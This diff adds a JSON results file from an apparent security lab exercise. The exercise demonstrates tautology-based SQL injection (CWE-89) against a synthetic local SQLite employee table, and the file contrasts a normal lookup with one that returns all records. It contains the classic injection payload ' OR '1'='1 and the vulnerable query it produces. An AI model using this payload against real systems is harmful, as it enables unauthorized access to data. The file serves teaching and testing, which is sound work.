@@ -1,0 +1,34 @@
+{
+  "lab": "02-sql-injection",
+  "classification": "CWE-89",
+  "technique": "Tautology-based SQL injection",
+  "environment": "Synthetic local SQLite database",
+  "legitimate": {
+    "input": "alice",
+    "query": "SELECT id, username, department, role\nFROM employees\nWHERE username = 'alice'",
+    "recordCount": 1,
+    "usernames": [
+      "alice"
+    ]
+  },
+  "injection": {
+    "input": "' OR '1'='1",
+    "query": "SELECT id, username, department, role\nFROM employees\nWHERE username = '' OR '1'='1'",
+    "recordCount": 6,
+    "usernames": [
+      "alice",
+      "bob",
+      "charlie",
+      "diana",
+      "eve",
+      "frank"
+    ]
+  },
+  "observation": "The injected condition caused the vulnerable lookup to return all six synthetic employee records.",
+  "limitations": [
+    "Controlled synthetic database only",
+    "No external system targeted",
+    "Read-only database connection",
+    "No data modification attempted"
+  ]
+}
